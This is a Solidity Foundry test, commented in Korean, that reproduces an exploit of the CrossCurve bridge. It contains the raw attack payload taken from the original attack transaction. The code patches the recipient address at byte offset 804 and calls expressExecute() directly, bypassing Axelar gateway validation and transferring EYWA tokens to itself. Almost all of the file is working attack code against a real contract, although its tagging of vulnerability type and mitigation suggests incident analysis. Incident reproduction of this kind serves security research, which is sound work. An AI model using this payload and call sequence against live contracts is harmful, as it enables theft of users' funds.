// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./IncidentBase.sol";

/*
┌─────────────────────────────────────────────────────────┐
│  CrossCurve PoC 테스트                                   │
│                                                         │
│  공격 재현:                                              │
│  1. 원본 payload에서 수신자를 address(this)로 패치        │
│  2. commandId도 커스텀 값 사용 → 원본 리플레이가 아님     │
│  3. expressExecute 호출 → Gateway 검증 우회 → 토큰 탈취 │
│                                                         │
│  실행:                                                   │
│  forge test --match-path test/2026-02-01_CrossCurve/PoC_template.t.sol -vvvv │
└─────────────────────────────────────────────────────────┘

@Title: CrossCurve Bridge expressExecute Exploit PoC
@Source: Phalcon trace of attack tx 0x37d9b9...
@Vulnerability: Axelar GMP SDK expressExecute() 호출자 검증 부재
@AttackFlow:
    1. 원본 payload 복사 → 수신자만 내 주소로 패치
    2. expressExecute() 직접 호출 → Gateway 검증 우회
    3. ReceiverAxelar → PortalV2.resume() → EYWA 탈취
*/

contract PoC_crosscurve is IncidentBase {
    function setUp() public override {
        super.setUp();
        // payload 안의 수신자를 address(this)로 패치할 것이므로
        // 토큰은 이 테스트 컨트랙트로 옴
        beneficiary = address(this);
    }

    /// @dev payload 바이트 오프셋 804에 있는 수신자 주소를 교체
    ///      공격 tx의 원본 수신자: 0x632400f4... (공격자 EOA)
    ///      패치 후 수신자: newRecipient (address(this))
    ///
    ///      ABI 인코딩 상 주소는 32바이트 워드의 마지막 20바이트에 위치
    ///      mstore로 32바이트를 쓰면 앞 12바이트는 0으로 채워짐
    function _patchRecipient(
        bytes memory payload,
        address newRecipient
    ) internal pure {
        assembly {
            // payload 메모리 레이아웃:
            //   [0..31]  = bytes length
            //   [32..]   = actual data
            // data 내 오프셋 804에 수신자 워드(32바이트)가 있음
            mstore(add(add(payload, 32), 804), newRecipient)
        }
    }

    function testExploit() public exploit {
        // ==================== 1. 분류 태깅 ====================
        addVulnerability(VulnerabilityType.ACCESS_CONTROL);
        addAttackVector(AttackVector.INSECURE_INTERFACE);
        addMitigation(Mitigation.ACCESS_CONTROL);

        // ==================== 2. 사전 상태 ====================
        uint256 eywaBalanceBefore = eywa.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[PRE] My EYWA balance",
            eywaBalanceBefore,
            18
        );

        // ==================== 3. Exploit 로직 ====================
        //
        // 공격 흐름:
        //   this → expressExecute() → ReceiverAxelar._execute()
        //   → Receiver.receiveData() → PortalV2(Diamond).resume()
        //   → EYWA.transfer() → address(this)에게 토큰 전송
        //
        // expressExecute는 Gateway.validateContractCall()을 호출하지 않고
        // isCommandExecuted()만 체크하므로 누구나 위조 payload로 호출 가능.

        // Step 1: commandId — 커스텀 값 사용 (원본 리플레이가 아님을 증명)
        bytes32 commandId = keccak256("crosscurve-poc-test");

        // Step 2: sourceChain & sourceAddress
        // peers["berachain"]에 등록된 값과 일치해야 ReceiverAxelar._execute() 통과
        string memory sourceChain = "berachain";
        string
            memory sourceAddress = "0x5eEdDcE72530e4fC96d43E3d70Fe09aD0D037175";

        // Step 3: payload — 공격 tx에서 추출한 원본
        // 내부에 수신자=0x632400f4(공격자), 토큰=EYWA, 수량=~10억개 포함
        bytes
            memory payload = hex"0000000000000000000000000000000000000000000000000000000000000080000000000000000000000000f3792bae7f35dcde2916c6e6a72ccd3a5330d56500000000000000000000000000000000000000000000000000000000000138de105b391f32e7c1e4224ff1a86ab4c6ab0742f5c68f39d485d04b149bda59a97c00000000000000000000000000000000000000000000000000000000000003e0000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3792bae7f35dcde2916c6e6a72ccd3a5330d56500000000000000000000000000000000000000000000000000000000000002844dc9fb35105b391f32e7c1e4224ff1a86ab4c6ab0742f5c68f39d485d04b149bda59a97c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000242550000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000008cb8c4263eb26b2349d74ea2cb1b27bc40709e120000000000000000000000000000000000000000033b1666d4acf7d79021f761000000000000000000000000cda36e1b514fcc52e4ca1238491e6e789a11a8bb000000000000000000000000632400f42e96a5deb547a179ca46b02c22cd25cd000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000138de000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000642509db2b4dc9fb3500000000000000000000000000000000000000000000000000000000000000000000000000000000f3792bae7f35dcde2916c6e6a72ccd3a5330d56500000000000000000000000000000000000000000000000000000000000138de000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

        // Step 4: 수신자 주소 패치
        // 공격자(0x632400f4...) → address(this) 로 교체
        // payload 바이트 오프셋 804에 위치
        _patchRecipient(payload, address(this));

        // Step 5: expressExecute 호출
        // 누구나 호출 가능 — msg.sender 검증 없음이 핵심 취약점
        executor.expressExecute(commandId, sourceChain, sourceAddress, payload);

        // ==================== 4. 수익 기록 ====================
        uint256 eywaBalanceAfter = eywa.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[POST] My EYWA balance",
            eywaBalanceAfter,
            18
        );

        if (eywaBalanceAfter > eywaBalanceBefore) {
            addProfit(EYWA_TOKEN, eywaBalanceAfter - eywaBalanceBefore);
        }
    }

    receive() external payable {}
}
